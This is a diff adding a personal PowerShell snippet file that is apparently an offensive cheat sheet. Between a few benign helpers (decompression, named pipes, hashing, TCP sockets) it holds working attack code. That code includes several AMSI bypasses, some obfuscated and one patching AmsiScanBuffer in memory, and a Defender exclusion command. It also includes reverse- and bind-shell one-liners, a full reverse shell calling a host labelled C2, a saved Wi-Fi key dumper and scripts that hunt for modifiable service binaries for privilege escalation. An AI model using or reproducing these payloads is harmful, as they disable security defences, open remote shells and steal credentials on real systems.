+    $compressedBytes = [Convert]::FromBase64String('y0jNyckHAA==')
+
+    # Create a MemoryStream from the compressed bytes
+    $compressedStream = [System.IO.MemoryStream]::new($compressedBytes)
+
+    # Create a DeflateStream to decompress the data
+    $deflateStream = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Decompress)
+
+    # Create a StreamReader to read the decompressed data
+    $streamReader = [System.IO.StreamReader]::new($deflateStream, [System.Text.Encoding]::ASCII)
+
+    # Read the entire content of the StreamReader
+    $decompressedContent = $streamReader.ReadToEnd()
+
+    # Dispose the streams
+    $deflateStream.Dispose()
+    $compressedStream.Dispose()
+    $streamReader.Dispose()
+
+    # Output the decompressed content
+    $decompressedContent
+
+#Split every second char of string && regex usage ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$split= $string -split '(.{2})' | Where-Object { $_ }
+
+
+$pattern = "^(\w+)\s{2}((?:[\d\w]+)+)"
+$c = Get-Content -Raw ./t.txt
+$c -split "`n" | ForEach-Object {
+    # Apply the regular expression pattern to each line
+    if ($_ -match $pattern) {
+	$m = $matches[2]
+	$bytes = $m.Trim() -split '(.{2})' | Where-Object { $_ }
+	$bytesWithPrefix = $bytes | ForEach-Object { ',0x' + $_ }
+	$bytesWithPrefix += ',0x90'
+        # Output the matched lines
+        $t += $bytesWithPrefix
+    }
+}
+
+#Get Property from idk ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Get-Service | Get-Member -MemberType Properties
+
+#Used in this example
+((Get-Process -Name "*Runtime*" | Select-Object -Index 1).Id)
+#it get's the property id of Get-Process results
+
+PS C:\Users\A1375> Get-Process | Get-Member -MemberType Properties
+
+
+   TypeName: System.Diagnostics.Process
+
+Name                       MemberType     Definition
+----                       ----------     ----------
+Handles                    AliasProperty  Handles = Handlecount
+Name                       AliasProperty  Name = ProcessName
+NPM                        AliasProperty  NPM = NonpagedSystemMemorySize64
+PM                         AliasProperty  PM = PagedMemorySize64
+SI                         AliasProperty  SI = SessionId
+VM                         AliasProperty  VM = VirtualMemorySize64
+WS                         AliasProperty  WS = WorkingSet64
+...
+
+#PIC:Pipes Communication between multiple Powershell instances ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#Limitation only Bytes meaning can't give a class like tcp.client.StreamReader
+
+# Create a named pipe server
+$pipeName = "MyNamedPipe"
+$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
+
+# Wait for a client to connect
+$pipe.WaitForConnection()
+
+# Define the variable to share
+$sharedVariable = "Hello, from Script 1!"
+
+# Convert the variable to bytes and write it to the pipe
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($sharedVariable)
+$pipe.Write($bytes, 0, $bytes.Length)
+
+# Close the pipe
+$pipe.Close()
+
+
+# Connect to the named pipe
+$pipeName = "MyNamedPipe"
+$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)
+
+# Connect to the server
+$pipe.Connect()
+
+# Read data from the pipe
+$bytes = New-Object byte[] 4096
+$bytesRead = $pipe.Read($bytes, 0, $bytes.Length)
+
+# Convert the bytes to a string
+$sharedVariable = [System.Text.Encoding]::UTF8.GetString($bytes, 0, $bytesRead)
+
+# Close the pipe
+$pipe.Close()
+
+# Display the shared variable
+Write-Host "Received from Script 1: $sharedVariable"
+
+#Get 256 Hash of String ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+$stringAsStream = [System.IO.MemoryStream]::new()
+$writer = [System.IO.StreamWriter]::new($stringAsStream)
+$writer.write("Hello world")
+$writer.Flush()
+$stringAsStream.Position = 0
+Get-FileHash -InputStream $stringAsStream | Select-Object Hash
+
+#Amsi ByPass: ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# IF THE BYPASSES CRASHES YOUR POWERSHELL PROCESS IT MEANS IT GOT DETECTED AS BEHAIVOR!!! CHANGE IT AND IT WORKS FINE
+#Source: https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6
+#Source: https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
+
+    #Orginal
+	
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+	
+    #Modified
+
+	#May not work in some cases because of “ and if input in powershell PS may close but just try again and it will work
+	CRASHES: $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
+	$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);for ($i = 0; $i -lt $buf.Length; $i++) {[System.Runtime.InteropServices.Marshal]::WriteByte($Ptr, $i, $buf[$i]);}
+	$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
+	 .( ([sTRiNg]$VErbOSEPrEFeRENCe)[1,3]+'x'-JOiN'') (NeW-OBJeCT iO.CompRESSiOn.DeFlATestReAm([SYStEM.Io.MEMOryStrEAm] [COnVeRt]::fROMBaSe64sTRing('Zc2xCsJAEATQXvAflrCQiyT5gWBhEzsRozZicXfZ4OImSu5SiPjvngFFsZwZmFeRz/a6Z22EIFvplkBDaGQgUIcNNcd84Ry1Rm75kvz2diWnkqQoLz1pe1JogDtAncCdGwgxHz8y4TNBNOOdZ3FRWNHO0TweRfUP1h8Q7QspmaR2Kl5duvVghG1aee3Zxt8ujW79dunXLTUL1aPbzJGCi00e6NFR2A0iKfp+oGQ6eQI=' ),[sYstEm.IO.ComPRessION.COMpREssioNmODE]::decompReSs )|fOREAch-object { NeW-OBJeCT sYstem.io.StREaMreADer($_,[systeM.TExt.enCODING]::AsciI ) }| FOrEaCh-oBJecT{$_.ReADTOeNd()} )
+
+
+#dotnet Amsi Bypass For execution of malicious exe which are loaded into memory
+
+#ORGINAL Get's detected:
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+
+Modifyed:
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@;
+Add-Type $Win32;
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll");
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer");
+$p = 0;
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);
+$Ptr = [IntPtr]::Add($Address, 0)  # Pointer to the memory location
+[Byte[]] $Patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3  # Byte array representing the patch
+for ($i = 0; $i -lt $Patch.Length; $i++) {
+    [System.Runtime.InteropServices.Marshal]::WriteByte($Ptr, $i, $Patch[$i]);
+}
+
+#ByPass with Priv: ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+mkdir "C:\Users\Public\Hello"
+Add-MpPreference -ExclusionPath 'C:\Users\Public\Hello'
+
+#TCP CONNECTIONS ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Set UP TCP LISTENER  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+#Windows working
+$endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 8080)
+$listener = New-Object System.Net.Sockets.TcpListener $endpoint
+#Linux SHORT
+$listener = New-Object System.Net.Sockets.TcpListener $endPoint
+
+#Linux LONG
+# Define the IP address and port to listen on
+$ipAddress = [System.Net.IPAddress]::Any  # Listen on any available IP address
+$port = 80  # Use the desired port number
+# Create an IPEndPoint to represent the local endpoint
+$endPoint = New-Object System.Net.IPEndPoint $ipAddress, $port
+# Create a TcpListener with the defined endpoint
+$listener = New-Object System.Net.Sockets.TcpListener $endPoint
+
+
+
+$listener.Start()
+
+# Accept incoming client connection
+$client = $listener.AcceptTcpClient()
+
+# Get the network stream for reading and writing data
+$stream = $client.GetStream()
+
+# Convert the data to be sent to bytes (assuming $data is a string)
+$bytesToSend = [System.Text.Encoding]::ASCII.GetBytes("Your message here")
+
+# Write the bytes to the network stream
+$stream.Write($bytesToSend, 0, $bytesToSend.Length)
+
+# Optionally, you can flush the stream to ensure all data is sent immediately
+$stream.Flush()
+
+# Close the connection and clean up resources
+$stream.Close()
+$client.Close()
+$listener.Stop()
+
+#SET UP TCP CLIENT  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+# Define the IP address and port to connect to
+$serverIPAddress = "127.0.0.1"  # Use the actual IP address of the server
+$serverPort = 80  # Use the actual port number the server is listening on
+
+# Create a new TCP client and connect to the server
+$client = New-Object System.Net.Sockets.TcpClient
+$client.Connect($serverIPAddress, $serverPort)
+
+# Get the network stream for reading and writing data
+$stream = $client.GetStream()
+
+# Optionally, you can read data from the stream if the server sends any
+#$data = New-Object byte[] 1024
+#$stream.Read($data, 0, $data.Length)
+
+#Receive data
+$message = [System.Text.Encoding]::ASCII.GetString($data)
+
+# Output the decoded message
+Write-Host $message
+
+#Makes things better?
+stram.Flush()
+
+# Close the connection and clean up resources
+$stream.Close()
+$client.Close()
+
+
+#PREP ONLINER  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+#Listener Print rec msg
+$endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 8080);$listener = New-Object System.Net.Sockets.TcpListener $endPoint;$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();$data = New-Object byte[] 1024;while ($true) {$stream.Read($data, 0, $data.Length);$message = [System.Text.Encoding]::ASCII.GetString($data);Write-Host $message}
+
+#Client Send msg
+$client = New-Object System.Net.Sockets.TcpClient;$client.Connect("127.0.0.1", 8080);$stream = $client.GetStream();while ($true) {$msg=Read-Host;$bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($msg);$stream.Write($bytesToSend, 0, $bytesToSend.Length);$stream.Flush()}
+
+#RevShell
+$client = New-Object System.Net.Sockets.TcpClient;$client.Connect("127.0.0.1", 8080);$stream = $client.GetStream();$data = New-Object byte[] 1024;while ($true){$stream.Read($data, 0, $data.Length);$message = [System.Text.Encoding]::ASCII.GetString($data);$out=Invoke-Expression $message 2>&1;$p = Get-Location|Select-Object -ExpandProperty Path;$bytesToSend = [System.Text.Encoding]::UTF8.GetBytes($out+"`n$p>");$stream.Write($bytesToSend, 0, $bytesToSend.Length);$stream.Flush()}
+
+#iex for nicer output
+$client = New-Object System.Net.Sockets.TcpClient;$client.Connect("192.168.1.172", 8080);$stream = $client.GetStream();$data = New-Object byte[] 1024;while ($true){$stream.Read($data, 0, $data.Length);$message = [System.Text.Encoding]::ASCII.GetString($data);$out=(iex $message 2>&1 | Out-String);$p = Get-Location|Select-Object -ExpandProperty Path;$bytesToSend = [System.Text.Encoding]::UTF8.GetBytes($out+"`n$p>");$stream.Write($bytesToSend, 0, $bytesToSend.Length);$stream.Flush()}
+
+#Bindshell ! Firewall blocked
+$endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 8080);$listener = New-Object System.Net.Sockets.TcpListener $endPoint;$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();$data = New-Object byte[] 1024;while ($true){$stream.Read($data, 0, $data.Length);$message = [System.Text.Encoding]::ASCII.GetString($data);$out=Invoke-Expression $message 2>&1;$p = Get-Location|Select-Object -ExpandProperty Path;$bytesToSend = [System.Text.Encoding]::UTF8.GetBytes($out+"`n$p>");$stream.Write($bytesToSend, 0, $bytesToSend.Length);$stream.Flush()}
+
+
+#ASYNC_TASKs ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$client = New-Object System.Net.Sockets.TcpClient;$client.Connect("192.168.1.172", 8080)
+$runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
+$runspacePool.Open()
+
+# Define the argument(s) to be passed to the script block
+#$argument = "YourArgumentHere"
+
+$powerShell = [powershell]::Create().AddScript({
+    param ($client)
+    $stream = $client.GetStream()
+    $reader = New-Object System.IO.StreamReader($stream)
+    $data = New-Object byte[] 1024
+     while ($true){$stream.Read($data, 0, $data.Length)
+	$message = [System.Text.Encoding]::ASCII.GetString($data)
+	$out=Invoke-Expression $message 2>&1
+	$p = Get-Location|Select-Object -ExpandProperty Path;$bytesToSend = [System.Text.Encoding]::UTF8.GetBytes($out+"`n$p>");$stream.Write($bytesToSend, 0, $bytesToSend.Length);$stream.Flush()}
+}).AddArgument($client)
+
+$powerShell.RunspacePool = $runspacePool
+$asyncResult = $powerShell.BeginInvoke()
+
+$powerShell1 = [powershell]::Create().AddScript({
+    param ($client)
+    $stream = $client.GetStream()
+    $data = New-Object byte[] 1024
+     while ($true){$stream.Read($data, 0, $data.Length)
+	$message = [System.Text.Encoding]::ASCII.GetString($data)
+	msg * $message
+	}
+}).AddArgument($client)
+
+$powerShell1.RunspacePool = $runspacePool
+$asyncResult = $powerShell1.BeginInvoke()
+
+# Optionally, you can wait for the asynchronous operation to complete
+# $powerShell.EndInvoke($asyncResult)
+
+# When you're done, close the runspace pool and clean up resources
+# $powerShell.Dispose()
+# $runspacePool.Close()
+# $runspacePool.Dispose()
+# $powerShell1.Dispose()
+
+
+#END
+#Usefull________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+#
+#Scripts________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+#Start 
+
+#Get Wlan Profiles with key ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+$profiles = Netsh wlan show profile | Select-String -Pattern 'All User Profile\s+:\s+(.+)'
+$profileInfo = @()
+
+foreach ($profile in $profiles) {
+    $profileName = $profile.Matches.Groups[1].Value
+    $profileData = Netsh wlan show profile $profileName key=clear
+    $securityKey = $profileData | Select-String -Pattern 'Key Content\s+:\s+(.+)' | ForEach-Object { $_.Matches.Groups[1].Value }
+    $ssidName = $profileData | Select-String -Pattern 'SSID name\s+:\s+(.+)' | ForEach-Object { $_.Matches.Groups[1].Value }
+    $authenticationType = $profileData | Select-String -Pattern 'Authentication\s+:\s+(.+)' | ForEach-Object { $_.Matches.Groups[1].Value }
+
+    $profileInfo += [PSCustomObject]@{
+        ProfileName = $profileName
+        SSIDName = $ssidName
+        AuthenticationType = $authenticationType
+        SecurityKey = $securityKey
+    }
+}
+
+$profileInfo
+
+#Get All exe dll files in Path which are modifyable with current privs ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$paths = $env:Path -split ';'
+foreach ($dir in $paths) {
+     # Get all .exe and .dll files in the directory
+     $files = Get-ChildItem -Path $dir -Include *.exe, *.dll -File -Recurse -ErrorAction SilentlyContinue
+
+     # Iterate over each file
+     foreach ($file in $files) {
+         # Check if the current user has permission to modify the file
+         $acl = Get-Acl -Path $file.FullName
+         $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+         $hasModifyPermission = $acl.Access | Where-Object { $_.IdentityReference.Value -eq $currentUser -and $_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Modify }
+
+         # If the user has modify permission, output the file path
+         if ($hasModifyPermission) {
+             Write-Host "File: $($file.FullName)"
+         }
+     }
+ }
+
+#Get Services .exe dll cmd bat vbs ps1 and check for permission to modify ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$pattern = "C:\\.+?.+\.(exe)|C:\\.+?.+\.(dll)|C:\\.+?.+\.(bat)|C:\\.+?.+\.(vbs)|C:\\.+?.+\.(cmd)|C:\\.+?.+\.(ps1)"
+
+Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
+
+        $ServiceName = $_.name
+        $ServicePath = $_.pathname
+        $ServiceStartName = $_.startname
+
+if ($ServicePath -match $pattern) {
+	$matchedPart = $matches[0]
+        #Write-Host "Service: $ServiceName`n$matchedPart`n$ServiceStartName`n"
+	$acl = Get-Acl -Path $matchedPart
+
+# Check if the current user has permission to modify the file 
+	$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+	$hasModifyPermission = $acl.Access | Where-Object { $_.IdentityReference.Value -eq $currentUser -and $_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Modify }
+	if ($hasModifyPermission) {
+		Write-Host "Service: $ServiceName`n$matchedPart`n$ServiceStartName`n"
+    		Write-Host "You have permission to modify the file."
+	} else {
+		Write-Host "Service: $matchedPart`n"
+    		#Write-Host "You do not have permission to modify the file."
+	}
+
+    }
+}
+
+# Iterate over each service ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Get-Service | ForEach-Object {
+    $serviceName = $_.Name
+    $path = if ($_.ServiceType -eq "Win32OwnProcess") {
+        (Get-WmiObject -Class Win32_Service -Filter "Name='$serviceName'").PathName
+    } else {
+        "Not available"
+    }
+
+    # Create a custom object to store the DisplayName and Path
+    $serviceInfo = [PSCustomObject]@{
+        DisplayName = $_.DisplayName
+        Path = $path
+    }
+
+    if ($path -ne "Not available") {
+	
+	if ($ServicePath -match $pattern) {
+	$matchedPart = $matches[0]
+        # Check if the current user has permission to modify the file
+        $acl = Get-Acl -Path $matchedPart
+        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+        $hasModifyPermission = $acl.Access | Where-Object { $_.IdentityReference.Value -eq $currentUser -and $_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Modify }
+	if ($hasModifyPermission) {Write-Host "MODIFYABLE";$serviceInfo}
+        # Update the serviceInfo object with permission information
+        $serviceInfo | Add-Member -MemberType NoteProperty -Name HasModifyPermission -Value $hasModifyPermission}
+    }
+
+}
+
+#Reverse Shells ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+do {
+    # Delay before establishing network connection, and between retries
+    Start-Sleep -Seconds 1
+
+    # Connect to C2
+    try{
+        $TCPClient = New-Object Net.Sockets.TCPClient('192.168.1.172', 8080)
+    } catch {}
+} until ($TCPClient.Connected)
+
+$NetworkStream = $TCPClient.GetStream()
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+
+# Writes a string to C2
+function WriteToStream ($String) {
+    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+
+    # Write to C2
+    $StreamWriter.Write($String + 'SHELL> ')
+    $StreamWriter.Flush()
+}
+
+# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+WriteToStream ''
+
+# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    # Encode command, remove last byte/newline
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    
+    # Execute command and save output (including errors thrown)
+    $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
+
+    # Write output to C2
+    WriteToStream ($Output)
+}
+# Closes the StreamWriter and the underlying TCPClient
+$StreamWriter.Close()
+
+#End
+#Scripts________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
